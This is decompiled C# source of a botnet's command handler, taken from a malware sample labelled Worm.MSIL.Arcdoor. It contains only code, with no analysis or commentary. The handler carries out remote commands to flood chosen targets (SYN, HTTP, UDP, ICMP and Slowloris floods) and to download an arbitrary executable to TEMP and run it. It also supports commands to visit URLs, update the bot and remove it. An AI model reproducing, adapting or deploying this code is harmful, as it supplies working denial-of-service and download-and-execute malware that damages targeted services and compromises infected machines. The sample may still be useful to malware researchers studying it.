// Decompiled with JetBrains decompiler
// Type: SysDriver.cCommandHandler
// Assembly: SysDriver, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8A26C35F-BA28-4E81-84A7-2E70BFB0BF2E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Worm.MSIL.Arcdoor.rd-c1c8aa0e1c017af03529dea9d73a38478f6fd04477b4a68c5889f87bb96df945.exe

using System;
using System.Diagnostics;
using System.Net;

namespace SysDriver
{
  internal class cCommandHandler
  {
    public void handleCommand(string sCommand)
    {
      string[] strArray = new string[0];
      WebClient webClient = new WebClient();
      try
      {
        strArray = sCommand.Split('*');
      }
      catch
      {
      }
      switch (strArray[0])
      {
        case "synflood":
          try
          {
            nSYNFlood.sFHost = Convert.ToString(strArray[1]);
            nSYNFlood.uPort = ushort.Parse(strArray[2]);
            nSYNFlood.iThreads = Convert.ToInt32(strArray[3]);
            nSYNFlood.iSSockets = Convert.ToInt32(strArray[4]);
            nSYNFlood.StartSYNFlood();
            break;
          }
          catch
          {
            break;
          }
        case "httpflood":
          try
          {
            nHTTPFlood.sFHost = Convert.ToString(strArray[1]);
            nHTTPFlood.iThreads = Convert.ToInt32(strArray[2]);
            nHTTPFlood.StartHTTPFlood();
            break;
          }
          catch
          {
            break;
          }
        case "udpflood":
          try
          {
            nUDPFlood.sFHost = Convert.ToString(strArray[1]);
            nUDPFlood.uPort = ushort.Parse(strArray[2]);
            nUDPFlood.iThreads = Convert.ToInt32(strArray[3]);
            nUDPFlood.iUDPSockets = Convert.ToInt32(strArray[4]);
            nUDPFlood.iPSize = Convert.ToInt32(strArray[5]);
            nUDPFlood.StartUDPFlood();
            break;
          }
          catch
          {
            break;
          }
        case "icmpflood":
          try
          {
            nICMPFlood.sFHost = Convert.ToString(strArray[1]);
            nICMPFlood.iThreads = Convert.ToInt32(strArray[2]);
            nICMPFlood.iICMPSockets = Convert.ToInt32(strArray[3]);
            nICMPFlood.iPSize = Convert.ToInt32(strArray[4]);
            nICMPFlood.StartICMPFlood();
            break;
          }
          catch
          {
            break;
          }
        case "slowlorisflood":
          try
          {
            nSlowlorisFlood.sFHost = Convert.ToString(strArray[1]);
            nSlowlorisFlood.uPort = ushort.Parse(strArray[2]);
            nSlowlorisFlood.iThreads = Convert.ToInt32(strArray[3]);
            nSlowlorisFlood.iSockets = Convert.ToInt32(strArray[4]);
            nSlowlorisFlood.iTimeout = Convert.ToInt32(strArray[5]);
            nSlowlorisFlood.Start();
            break;
          }
          catch
          {
            break;
          }
        case "download":
          try
          {
            string str = cMain.FunctionClass.genString(new Random().Next(5, 12)) + ".exe";
            string address = Convert.ToString(strArray[1]);
            if (!address.StartsWith("http://"))
              address = "http://" + address;
            webClient.DownloadFile(address, Environment.GetEnvironmentVariable("TEMP") + "\\" + str);
            new Process()
            {
              StartInfo = {
                FileName = (Environment.GetEnvironmentVariable("TEMP") + "\\" + str)
              }
            }.Start();
            break;
          }
          catch
          {
            break;
          }
        case "visit":
          try
          {
            string URI = Convert.ToString(strArray[1]);
            if (!URI.StartsWith("http://"))
              URI = "http://" + URI;
            this.HTTPRequest(URI);
            break;
          }
          catch
          {
            break;
          }
        case "update":
          string sFileAddress = Convert.ToString(strArray[1]);
          if (!sFileAddress.StartsWith("http://"))
            sFileAddress = "http://" + sFileAddress;
          cMain.SystemClass.updateBot(sFileAddress);
          break;
        case "remove":
          if (!(strArray[1] == cMain.ConfigClass.sPCName) && !(strArray[1].ToUpper() == "ALL"))
            break;
          cMain.SystemClass.RemoveBot();
          break;
      }
    }

    private void HTTPRequest(string URI)
    {
      WebClient webClient = new WebClient();
      webClient.OpenRead(URI);
      webClient.Dispose();
    }
  }
}
